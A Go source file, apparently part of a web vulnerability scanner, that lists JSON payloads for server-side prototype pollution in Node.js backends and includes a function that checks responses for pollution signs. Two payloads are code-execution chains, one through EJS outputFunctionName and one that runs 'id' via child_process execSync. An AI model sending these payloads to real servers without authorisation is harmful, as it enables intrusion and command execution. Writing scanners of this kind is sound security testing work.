package sspp

import "strings"

// Probe is a JSON body template for server-side prototype pollution testing.
type Probe struct {
	Body   string
	Name   string
	Signal string
}

// Probes returns SSPP JSON merge payloads for Node.js-style backends.
func Probes() []Probe {
	return []Probe{
		{Body: `{"__proto__":{"polluted":true}}`, Name: "proto_key", Signal: "proto_pollution"},
		{Body: `{"constructor":{"prototype":{"polluted":true}}}`, Name: "constructor_proto", Signal: "constructor_pollution"},
		{Body: `{"__proto__":{"toString":"polluted"}}`, Name: "proto_toString", Signal: "proto_toString_hook"},
		{Body: `{"__proto__":{"valueOf":"polluted"}}`, Name: "proto_valueOf", Signal: "proto_valueOf_hook"},
		{Body: `{"__proto__":{"env":"production"}}`, Name: "proto_env", Signal: "proto_env_override"},
		{Body: `{"__proto__":{"status":500}}`, Name: "proto_status", Signal: "proto_status_override"},
		{Body: `{"a":{"__proto__":{"polluted":true}}}`, Name: "nested_proto", Signal: "nested_proto_pollution"},
		{Body: `{"__proto__":{"outputFunctionName":"x;throw Object.assign(new Error('akca-sspp'),{polluted:true})//"}}`, Name: "ejs_output_fn", Signal: "template_proto_rce_chain"},
		{Body: `{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(process.mainModule.require('child_process').execSync('id').toString())//"}}`, Name: "node_shell_chain", Signal: "node_child_process_chain"},
	}
}

// Analyze compares baseline and probe responses for prototype pollution indicators.
func Analyze(baselineBody string, baselineStatus int, probeBody string, probeStatus int, probe Probe) (bool, string) {
	probeLower := strings.ToLower(probeBody)
	if strings.Contains(probeLower, "polluted") || strings.Contains(probeLower, "akca-sspp") {
		return true, probe.Signal
	}
	if probeStatus >= 500 && baselineStatus < 500 {
		for _, kw := range []string{"prototype", "__proto__", "cannot read propert", "merge", "object.assign"} {
			if strings.Contains(probeLower, kw) {
				return true, "prototype_error_disclosure"
			}
		}
	}
	if probeBody != baselineBody {
		for _, kw := range []string{"__proto__", "prototype pollution", "object prototype", "polluted"} {
			if strings.Contains(probeLower, kw) {
				return true, "prototype_behavior_change"
			}
		}
	}
	return false, ""
}
